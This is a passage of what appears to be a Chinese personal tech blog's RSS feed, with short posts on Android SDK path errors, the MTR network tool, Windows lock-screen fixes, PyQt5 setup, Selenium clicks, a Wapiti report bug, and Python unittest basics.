&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;5结果&#34;&gt;5、结果&lt;/h3&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202205051058077.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202205051058077.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>BUG—Android CMD 工具路径无法识别</title>
        <link>https://ac-lm.github.io/posts/bug/bugandroid-cmd-%E5%B7%A5%E5%85%B7%E8%B7%AF%E5%BE%84%E6%97%A0%E6%B3%95%E8%AF%86%E5%88%AB/</link>
        <pubDate>Thu, 03 Dec 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/bug/bugandroid-cmd-%E5%B7%A5%E5%85%B7%E8%B7%AF%E5%BE%84%E6%97%A0%E6%B3%95%E8%AF%86%E5%88%AB/</guid>
        <description>&lt;h2 id=&#34;bug-描述&#34;&gt;BUG 描述&lt;/h2&gt;
&lt;p&gt;执行 Android cmd 工具 sdkmanager 命令时无法找到对应路径&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;Error: Could not determine SDK root. 
Error: Either specify it explicitly with --sdk_root&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; or move this package into its expected location: &lt;span style=&#34;color:#ae81ff&#34;&gt;\c&lt;/span&gt;mdline-tools&lt;span style=&#34;color:#ae81ff&#34;&gt;\l&lt;/span&gt;atest&lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;resolution&#34;&gt;Resolution&lt;/h2&gt;
&lt;p&gt;Since new updates, there are some changes that are not mentioned in the documentation. After unzipping the command line tools package, the top-most directory you&amp;rsquo;ll get is cmdline-tools.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Rename the unpacked directory from cmdline-tools to tools, and place it under $C:/Android/cmdline-tools&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://stackoverflow.com/questions/65262340/cmdline-tools-could-not-determine-sdk-root&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; cmdline-tools : could not determine SDK root  @stackoverflow &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>Linux—MTR 链路测试工具</title>
        <link>https://ac-lm.github.io/posts/linux/linuxmtr-%E9%93%BE%E8%B7%AF%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/</link>
        <pubDate>Thu, 03 Dec 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/linux/linuxmtr-%E9%93%BE%E8%B7%AF%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/</guid>
        <description>&lt;p&gt;当客户端访问目标服务器或负载均衡，使用ping命令测试出现丢包或不通时，可以通过 MTR 等工具进行&lt;strong&gt;链路测试&lt;/strong&gt;来判断问题来源。&lt;/p&gt;
&lt;h2 id=&#34;1mtr&#34;&gt;1.MTR&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;MTR（My traceroute）是几乎所有 Linux 发行版本预装的网络测试工具，此工具也有对应的 Windows 版本，名称为 WinMTR。&lt;/li&gt;
&lt;li&gt;MTR 工具将 &lt;strong&gt;ping&lt;/strong&gt; 和 &lt;strong&gt;traceroute&lt;/strong&gt; 命令的功能并入了同一个工具中，实现更强大的功能。&lt;/li&gt;
&lt;li&gt;Linux 版本的 MTR 命令&lt;strong&gt;默认发送 ICMP 数据包&lt;/strong&gt;进行链路探测。可以&lt;strong&gt;通过 -u 参数来指定使用 UDP 数据包&lt;/strong&gt;用于探测。&lt;/li&gt;
&lt;li&gt;相对于 traceroute 命令只会做一次链路跟踪测试，MTR 命令会对链路上的相关节点做持续探测并给出相应的统计信息。所以，MTR 命令能避免节点波动对测试结果的影响。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;2mtr的使用&#34;&gt;2.MTR的使用&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;mtr 192.168.1.243
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;默认配置下，返回结果中各数据列的说明如下。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第一列（Host）：节点 IP 地址和域名。如前面所示，按 n 键可以切换显示。&lt;/li&gt;
&lt;li&gt;第二列（Loss%）：节点丢包率。&lt;/li&gt;
&lt;li&gt;第三列（Snt）：每秒发送数据包数。默认值是10，可以通过参数 -c 指定。&lt;/li&gt;
&lt;li&gt;第四列（Last）：最近一次的探测延迟值。&lt;/li&gt;
&lt;li&gt;第五、六、七列（Avg、Best、Wrst）：分别是探测延迟的平均值、最小值和最大值。&lt;/li&gt;
&lt;li&gt;第八列（StDev）：标准偏差。越大说明相应节点越不稳定。&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>BUG—SSH 无法连接虚拟机</title>
        <link>https://ac-lm.github.io/posts/bug/bugssh-%E6%97%A0%E6%B3%95%E8%BF%9E%E6%8E%A5%E8%99%9A%E6%8B%9F%E6%9C%BA/</link>
        <pubDate>Wed, 02 Dec 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/bug/bugssh-%E6%97%A0%E6%B3%95%E8%BF%9E%E6%8E%A5%E8%99%9A%E6%8B%9F%E6%9C%BA/</guid>
        <description>&lt;h2 id=&#34;bug描述&#34;&gt;BUG描述&lt;/h2&gt;
&lt;p&gt;无法使用 SSH 连接虚拟机，使用 Ping 指令，能从虚拟机中 Ping 通主机，但不能从外部主机 Ping 通虚拟机。&lt;/p&gt;
&lt;h2 id=&#34;resolution&#34;&gt;Resolution&lt;/h2&gt;
&lt;p&gt;注意网关配置的问题，查看网关是否错误，可以打开网络适配器，右键虚拟网卡，诊断，重置网卡，重新配置网关。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>BUG—Win10 锁屏丢失</title>
        <link>https://ac-lm.github.io/posts/bug/bugwin10-%E9%94%81%E5%B1%8F%E4%B8%A2%E5%A4%B1/</link>
        <pubDate>Wed, 02 Dec 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/bug/bugwin10-%E9%94%81%E5%B1%8F%E4%B8%A2%E5%A4%B1/</guid>
        <description>&lt;h2 id=&#34;bug描述&#34;&gt;BUG描述&lt;/h2&gt;
&lt;p&gt;Windows10 在锁屏时会偶尔出现不是自己设置的图片的问题，锁屏会变为默认图片。怀疑是由于用户的缓存被清理，启动时变为了默认用户。&lt;/p&gt;
&lt;h2 id=&#34;resolution&#34;&gt;Resolution&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;Win+R&lt;/code&gt; 打开运行，输入&lt;code&gt;%ProgramData%\Microsoft\Windows&lt;/code&gt;打开 Win10 配置文件夹，寻找到&lt;code&gt;SystemData&lt;/code&gt;文件夹，双击打开。&lt;/p&gt;
&lt;p&gt;若没有权限，右键-&amp;gt;属性-&amp;gt;安全-&amp;gt;高级-&amp;gt;上面栏的所有者更改-&amp;gt;输入用户名(登陆账号名如LM)-&amp;gt;检查名称-&amp;gt;确认用户-&amp;gt;确认-&amp;gt;替换子容器和对象的所有者-&amp;gt;确定-&amp;gt;成功获取权限&lt;/p&gt;
&lt;p&gt;进入&lt;code&gt;SystemData&lt;/code&gt;，发现存在形如&lt;code&gt;S-1-5-18&lt;/code&gt;和&lt;code&gt;S-1-5-21-&lt;/code&gt;的文件夹(为用户的锁屏配置文件)，&lt;code&gt;S-1-5-18&lt;/code&gt;为默认配置，打开&lt;code&gt;S-1-5-21-&amp;gt;ReadOnly&lt;/code&gt;，目录下&lt;code&gt;LockScreen_W，LockScreen_B&lt;/code&gt;即为锁屏图片。LockScreen_B为用户设置，LockScreen_W为默认，即注销后的锁屏，更改文件内容以修改锁屏&lt;/p&gt;
</description>
        </item>
        <item>
        <title>PyQt5—安装</title>
        <link>https://ac-lm.github.io/posts/pyqt5/pyqt5%E5%AE%89%E8%A3%85/</link>
        <pubDate>Tue, 01 Dec 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/pyqt5/pyqt5%E5%AE%89%E8%A3%85/</guid>
        <description>&lt;h2 id=&#34;安装库与工具&#34;&gt;安装库与工具&lt;/h2&gt;
&lt;p&gt;PyQt5 是对 Qt 所有类的 Python 封装，结合 Python 简洁的语法，用户可以使用 PyQt5 高效、简单地开发出自己想要的程序。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;pip install PyQt5
pip install PyQt5&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;tools
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;qtdesigner&#34;&gt;QTdesigner&lt;/h2&gt;
&lt;p&gt;路径：&lt;code&gt;Lib\site-packages\qt5_applications\Qt\bin\designer.exe&lt;/code&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>随记—WebDriver click 与 JavaScript click 的区别</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0webdriver-click-%E4%B8%8E-javascript-click-%E7%9A%84%E5%8C%BA%E5%88%AB/</link>
        <pubDate>Tue, 01 Dec 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0webdriver-click-%E4%B8%8E-javascript-click-%E7%9A%84%E5%8C%BA%E5%88%AB/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;原文参考：&lt;a class=&#34;link&#34; href=&#34;https://stackoverflow.com/questions/34562061/webdriver-click-vs-javascript-click&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; webdriver-click-vs-javascript-click @stackoverflow &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;问题出现&#34;&gt;问题出现&lt;/h2&gt;
&lt;p&gt;在自动测试时有时候会出现无法通过 selenium WebDriver 点击命令来单击元素，完成操作，但是可以通过执行JavaScript来单击该元素来解决这个问题。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;element &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; driver&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;find_element_by_id(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;myid&amp;#34;&lt;/span&gt;)
driver&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;execute_script(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;arguments[0].click();&amp;#34;&lt;/span&gt;, element)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;回答&#34;&gt;回答&lt;/h2&gt;
&lt;p&gt;这两种方法的本质区别在浏览器的操作上：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;WebDriver：**当 WebDriver 执行单击时，它会尽可能地模拟当真实用户使用浏览器时发生的情况。**比如您有一个元素 A，该按钮显示&amp;quot;单击我&amp;quot;，元素 B 是一个透明但具有其尺寸和设置的元素 B，B 完全覆盖 A。然后，您告诉 WebDriver 单击 A，WebDriver 将模拟单击，但结果却是 B 首先接收单击。这是因为 B 覆盖 A，如果用户尝试单击 A，则 B 将首先获取事件。A 最终是否会获得单击事件取决于 B 处理事件的方式。无论如何，在这种情况下，WebDriver 的行为与实际用户尝试单击 A 时的行为相同。&lt;/li&gt;
&lt;li&gt;JavaScript：**假如您使用 JavaScript 来做 。单击此方法不会重现用户尝试单击 A 时真正发生的情况。**JavaScript 将事件直接发送到 A，B 不会收到任何事件。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;这也就解释了为什么 JavaScript 单击在 WebDriver 单击不起作用时有效？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;正如我上面提到的，WebDriver 将尽力模拟当真实用户使用浏览器时发生的情况。事实是，DOM 可以包含用户无法与之交互的元素，并且 WebDriver 不允许您单击这些元素。除了我提到的重叠情况外，这还要求不能单击不可见的元素。我在其他一些问题中看到的一个常见情况是有人试图与 DOM 中已经存在的 GUI 元素进行交互，但仅在操作某些其他元素时才可见。这有时会与下拉菜单有关：您必须先单击显示下拉列表的按钮，然后才能选择菜单项。如果有人尝试在菜单可见之前单击菜单项，WebDriver 会犹豫，并说无法操作该元素。&lt;strong&gt;如果此人随后尝试使用 JavaScript 进行操作，它将起作用，因为事件直接传递到元素，而不考虑可见性。&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;何时应使用-javascript-单击&#34;&gt;何时应使用 JavaScript 单击？&lt;/h2&gt;
&lt;p&gt;如果你使用Selenium来测试一个应用程序，我对这个问题的回答是&amp;quot;几乎永远不会&amp;quot;。一方面，您的 Selenium 测试应重现用户对浏览器将执行哪些操作。以下拉菜单为例：测试应单击首先显示下拉菜单的按钮，然后单击菜单项。如果 GUI 出现问题，因为该按钮不可见，或者按钮无法显示菜单项或类似操作，则您的测试将失败，您将检测到 Bug。如果使用 JavaScript 单击四周，则无法通过自动测试检测这些 Bug。&lt;/p&gt;
&lt;p&gt;我说&amp;quot;几乎从不&amp;quot;，因为使用JavaScript可能有例外。不过，它们应该非常罕见。如果使用 Selenium来刮取站点，则尝试重现用户行为就没那么重要了。因此，使用 JavaScript 绕过 GUI 不是问题。&lt;/p&gt;
&lt;h2 id=&#34;ps&#34;&gt;PS&lt;/h2&gt;
&lt;p&gt;WebDriver 执行的单击尝试在执行事件时尽可能接近模拟真实用户的行为，即使元素不可交互。当出现如下情况时WebDriver 会出现报错。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;当单击坐标处顶部的元素不是目标元素或后代时&lt;/li&gt;
&lt;li&gt;当元素没有正大小或它是完全透明的&lt;/li&gt;
&lt;li&gt;当元素是禁用的输入或按钮时&lt;/li&gt;
&lt;li&gt;当元素禁用鼠标指针时&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;WebDriver 与 JavaScript 的异同。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;JavaScript 将始终执行默认操作，如果元素已禁用，则充其量会以静默方式失败。&lt;/li&gt;
&lt;li&gt;WebDriver 会像真实用户一样发出所有事件（鼠标移动、鼠标悬停、鼠标悬停、单击&amp;hellip;）。&lt;/li&gt;
&lt;li&gt;JavaScript 仅发出事件。页面可能依赖于这些额外的事件，如果它们未发出，它们的行为可能会有所不同。&lt;/li&gt;
&lt;li&gt;JavaScript 发出的事件没有单击的坐标。&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>BUG—Wapiti 报告丢失 js 文件</title>
        <link>https://ac-lm.github.io/posts/bug/bugwapiti-%E6%8A%A5%E5%91%8A%E4%B8%A2%E5%A4%B1-js-%E6%96%87%E4%BB%B6/</link>
        <pubDate>Mon, 30 Nov 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/bug/bugwapiti-%E6%8A%A5%E5%91%8A%E4%B8%A2%E5%A4%B1-js-%E6%96%87%E4%BB%B6/</guid>
        <description>&lt;h2 id=&#34;bug描述&#34;&gt;BUG描述&lt;/h2&gt;
&lt;p&gt;在 wapiti 的 3.0.4 版本中：&lt;code&gt;HTTP request and cURL command hidden on html report&lt;/code&gt;，HTTP 报告缺少 js 文件&lt;/p&gt;
&lt;h2 id=&#34;resolution&#34;&gt;Resolution&lt;/h2&gt;
&lt;p&gt;需手动从目录 &lt;code&gt;wapitiCore/report_template&lt;/code&gt; 中找到并添加&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Ok, when generating the html report it is supposed to copy the js file from wapitiCore/report_template into output directory, that is why it was missing.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;参考文献：&lt;a class=&#34;link&#34; href=&#34;https://github.com/wapiti-scanner/wapiti/issues/86&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; github-wapiti-issues @Maxime Alay-Eddine &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>Python—unittest 单元测试框架</title>
        <link>https://ac-lm.github.io/posts/python/pythonunittest-%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/</link>
        <pubDate>Mon, 30 Nov 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/python/pythonunittest-%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/</guid>
        <description>&lt;h2 id=&#34;1test-case&#34;&gt;1.Test Case&lt;/h2&gt;
&lt;p&gt;一个 TestCase 的实例就是一个测试用例。一个完整的测试流程，包括测试前准备环境的搭建(setUp)，执行测试代码 (run)，以及测试后环境的还原(tearDown)。元测试(unit test)的本质也就在这里，一个测试用例是一个完整的测试单元，通过运行这个测试单元，可以对某一个问题进行验证。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;testcase&lt;/span&gt;(unittest&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;TestCase):
    &lt;span style=&#34;color:#a6e22e&#34;&gt;@classmethod&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;setUpClass&lt;/span&gt;(self):
        &lt;span style=&#34;color:#75715e&#34;&gt;# 所有的测试方法运行前运行，整个测试过程中只执行一次。&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;setUp&lt;/span&gt;(self):
        &lt;span style=&#34;color:#75715e&#34;&gt;# 每个测试方法运行前运行，一条用例执行一次，若N次用例就执行N次。&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;tearDown&lt;/span&gt;(self):
        &lt;span style=&#34;color:#75715e&#34;&gt;# 每个测试方法运行结束后运行,一条用例执行一次，若N次用例就执行N次。&lt;/span&gt;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;@classmethod&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;tearDownClass&lt;/span&gt;(self):
        &lt;span style=&#34;color:#75715e&#34;&gt;# 所有的测试方法运行结束后运行，整个测试过程中只执行一次。&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test_01&lt;/span&gt;(self):
        &lt;span style=&#34;color:#75715e&#34;&gt;# 测试用例&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2test-suite&#34;&gt;2.Test Suite&lt;/h2&gt;
&lt;p&gt;多个测试用例集合在一起，就是TestSuite，而且TestSuite也可以嵌套TestSuite。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;:
    &lt;span style=&#34;color:#75715e&#34;&gt;# 构造TestSuite&lt;/span&gt;
    suite &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; unittest&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;TestSuite()
    suite&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;addTest(testcase(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test_01&amp;#34;&lt;/span&gt;))
    suite&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;addTest(testcase(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test_02&amp;#34;&lt;/span&gt;))
    &lt;span style=&#34;color:#75715e&#34;&gt;# 执行测试&lt;/span&gt;
    runner &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; unittest&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;TextTestRunner()
    runner&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;run(suite)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3test-loader&#34;&gt;3.Test Loader&lt;/h2&gt;
&lt;p&gt;是用来加载TestCase到TestSuite中的，其中有几个 loadTestsFrom??() 方法，就是从各个地方寻找TestCase，创建它们的实例，然后add到TestSuite中，再返回一个TestSuite实例。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;:
    &lt;span style=&#34;color:#75715e&#34;&gt;#此用法可以同时测试多个类&lt;/span&gt;
    suite1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; unittest&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;TestLoader()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;loadTestsFromTestCase(TestCase1)
    suite2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; unittest&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;TestLoader()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;loadTestsFromTestCase(TestCase2)
    suite &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; unittest&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;TestSuite([suite1, suite2])
&lt;span style=&#34;color:#75715e&#34;&gt;#-------------------------------------------------------------------------------------&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 匹配test_case目录下所有以test开头的py文件，执行这些py文件下的所有测试用例&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;:
    test_dir &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./test_case&amp;#34;&lt;/span&gt;
    discover &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; unittest&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;defaultTestLoader&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;discover(test_dir, pattern&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test*.py&amp;#34;&lt;/span&gt;)
    runner&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;unittest&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;TextTestRunner()
    runner&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;run(discover)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;4编写规范&#34;&gt;4.编写规范&lt;/h2&gt;
&lt;p&gt;使用unittest编写python的单元测试代码，包括如下几个步骤：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1、编写一个python类，继承unittest模块中的TestCase类，这就是一个测试类&lt;/li&gt;
&lt;li&gt;2、在上面编写的测试类中定义测试方法（这个就是指的测试用例），&lt;strong&gt;每个方法的方法名要求以test打头，没有额外的参数。&lt;/strong&gt; 在该测试方法中调用被测试代码，校验测试结果，TestCase类中提供了很多标准的校验方法，如最常见的assertEqual。&lt;/li&gt;
&lt;li&gt;3、&lt;strong&gt;执行unittest.main() ，该函数会负责运行测试，它会实例化所有TestCase的子类，并运行其中所有以test打头的方法。&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;5断言&#34;&gt;5.断言&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;assertEqual(a, b) &lt;span style=&#34;color:#75715e&#34;&gt;#  a == b&lt;/span&gt;
assertNotEqual(a, b)  &lt;span style=&#34;color:#75715e&#34;&gt;# a != b&lt;/span&gt;
assertTrue(x) &lt;span style=&#34;color:#75715e&#34;&gt;#  bool(x) is True&lt;/span&gt;
assertFalse(x) &lt;span style=&#34;color:#75715e&#34;&gt;#  bool(x) is False&lt;/span&gt;
assertIs(a, b)  &lt;span style=&#34;color:#75715e&#34;&gt;# a is b&lt;/span&gt;
assertIsNot(a, b)  &lt;span style=&#34;color:#75715e&#34;&gt;# a is not b&lt;/span&gt;
assertIsNone(x) &lt;span style=&#34;color:#75715e&#34;&gt;#  x is None&lt;/span&gt;
assertIsNotNone(x) &lt;span style=&#34;color:#75715e&#34;&gt;#  x is not None&lt;/span&gt;
assertIn(a, b)  &lt;span style=&#34;color:#75715e&#34;&gt;# a in b&lt;/span&gt;
assertNotIn(a, b) &lt;span style=&#34;color:#75715e&#34;&gt;#  a not in b&lt;/span&gt;
assertIsInstance(a, b) &lt;span style=&#34;color:#75715e&#34;&gt;#  isinstance(a, b)&lt;/span&gt;
assertNotIsInstance(a, b) &lt;span style=&#34;color:#75715e&#34;&gt;#  not isinstance(a, b)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;6unittest-网易邮箱登录案例&#34;&gt;6.unittest 网易邮箱登录案例&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; time
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; unittest &lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; selenium 
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; webdriver &lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; selenium.webdriver.support 
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; expected_conditions &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; EC

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;mailLogin&lt;/span&gt;(unittest&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;TestCase):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;setUp&lt;/span&gt;(self):
        url &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;https://mail.yeah.net/&amp;#39;&lt;/span&gt;
